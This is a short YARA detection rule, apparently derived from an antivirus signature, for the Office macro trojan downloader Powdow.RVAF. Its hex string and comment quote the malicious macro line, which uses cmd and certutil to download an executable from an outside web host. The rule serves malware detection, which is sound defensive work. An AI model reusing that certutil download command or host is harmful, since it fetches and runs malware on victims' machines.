
rule TrojanDownloader_O97M_Powdow_RVAF_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVAF!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 74 72 69 65 74 6c 6f 6e 67 76 69 6e 68 76 69 65 6e 2e 69 6e 66 6f 2f 2f 2e 74 6d 62 2f 49 44 34 2f 34 72 6f 64 74 7a 2e 65 78 65 22 22 } //1 Shell("cmd /c certutil.exe -urlcache -split -f ""http://trietlongvinhvien.info//.tmb/ID4/4rodtz.exe""
	condition:
		((#a_01_0  & 1)*1) >=1
 
}